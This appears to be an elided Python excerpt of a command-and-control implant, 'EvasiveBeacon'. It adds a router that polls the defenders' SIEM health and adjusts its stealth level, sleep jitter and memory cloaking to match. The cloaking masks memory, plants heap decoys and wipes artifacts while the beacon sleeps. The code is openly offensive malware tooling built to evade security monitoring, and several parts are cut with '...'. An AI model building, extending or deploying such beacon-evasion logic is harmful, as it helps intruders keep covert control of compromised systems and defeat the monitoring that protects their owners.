...
# NEW: Import adaptive SIEM-aware evasion router
try:
    from evasion.adaptive_router import AdaptiveEvasionRouter
    ADAPTIVE_ROUTER_AVAILABLE = True
except ImportError:
    ADAPTIVE_ROUTER_AVAILABLE = False
    AdaptiveEvasionRouter = None
    print("[!] Adaptive router not available")
...
class EvasiveBeacon:
    ...
    def __init__(self, config: BeaconConfig):
        ...
        # NEW: Initialize adaptive SIEM-aware router
        # Reads from /api/elite/siem-monitor/status to detect SIEM health
        # Adjusts beacon evasion posture (paranoid/balanced/aggressive) accordingly
        self.adaptive_router = None
        self.current_stealth_level = "paranoid"  # Default: maximum stealth
        if ADAPTIVE_ROUTER_AVAILABLE and config.evasion_level > 0:
            try:
                router_url = "http://localhost:8080/api/elite/siem-monitor/status"
                self.adaptive_router = AdaptiveEvasionRouter(local_api_url=router_url)
                print("[*] Adaptive SIEM router initialized")
            except Exception as e:
                print(f"[!] Failed to initialize adaptive router: {e}")
                self.adaptive_router = None
        ...
        if ADAPTIVE_ROUTER_AVAILABLE and config.evasion_level > 0:
            try:
                self.adaptive_router = AdaptiveEvasionRouter(
                    local_api_url=config.c2_host.replace(
                        config.c2_host.split(":")[0] if ":" in config.c2_host else config.c2_host,
                        "127.0.0.1" if "localhost" in config.c2_host or "127.0.0.1" in config.c2_host else config.c2_host
                    )
                )
            except Exception as e:
                print(f"[!] Failed to initialize adaptive router: {e}")
    ...
    def run(self):
        ...
        last_stealth_check = 0
        
        while self.state.is_running:
            try:
                # NEW: Periodically check SIEM health (every 10 calls or ~100 seconds)
                # This allows the beacon to adapt to defender state changes
                if self.adaptive_router and (time.time() - last_stealth_check) > 30:
                    self.current_stealth_level = self.adaptive_router.determine_stealth_level()
                    last_stealth_check = time.time()
                    if self.current_stealth_level == "aggressive":
                        print(f"[*] SIEM degraded: switching to AGGRESSIVE mode (fast ops)")
            ...
            # Sleep with obfuscation and cloaking (adaptive if router available)
            self._evasive_sleep()
    
    def _evasive_sleep(self):
        """
        Sleep with memory cloaking and obfuscation.
        Adaptive: adjusts behavior based on SIEM pipeline health.
        
        Stages:
        1. Pre-sleep cloak (mask memory, create decoys, wipe artifacts)
        2. Sleep with jitter (adaptive based on stealth level)
        3. Remask cycles during long sleeps
        4. Post-sleep uncloak
        """
        # Calculate sleep time (adaptive if router available)
        base_sleep = self.config.sleep_time
        
        if self.adaptive_router:
            # Use adaptive router to adjust sleep based on SIEM health
            sleep_time = self.adaptive_router.calculate_sleep_jitter(
                base_sleep,
                self.current_stealth_level
            )
        elif self.sleep_obfuscator:
        ...
        # Pre-sleep cloaking (adaptive memory mode based on stealth level)
        if self.cloaking_engine:
            # Use adaptive router's memory protection recommendation if available
            memory_mode = "page_noaccess"  # Default: maximum protection
            if self.adaptive_router:
                memory_mode = self.adaptive_router.get_memory_protection_mode(
                    self.current_stealth_level
                )
            ...
            if cloak_result['success']:
                mode_str = f" [{memory_mode}]"
                print(f"[*] Cloaked: {cloak_result['cloaked_regions']} regions, "
                      f"{cloak_result['heap_decoys']} decoys{mode_str}")
        
        # Log sleep with stealth level if using adaptive router
        stealth_tag = f" ({self.current_stealth_level})" if self.adaptive_router else ""
        print(f"[*] Sleeping {sleep_time:.1f}s (cloaked){stealth_tag}")
    ...
    def get_adaptive_status(self) -> Dict[str, Any]:
        """Get current adaptive evasion router status"""
        if not self.adaptive_router:
            return {'available': False, 'reason': 'Adaptive router not initialized'}
        
        return {
            'available': True,
            'current_stealth_level': self.current_stealth_level,
            'base_sleep': self.config.sleep_time,
            'memory_protection_mode': self.adaptive_router.get_memory_protection_mode(
                self.current_stealth_level
            )
        }
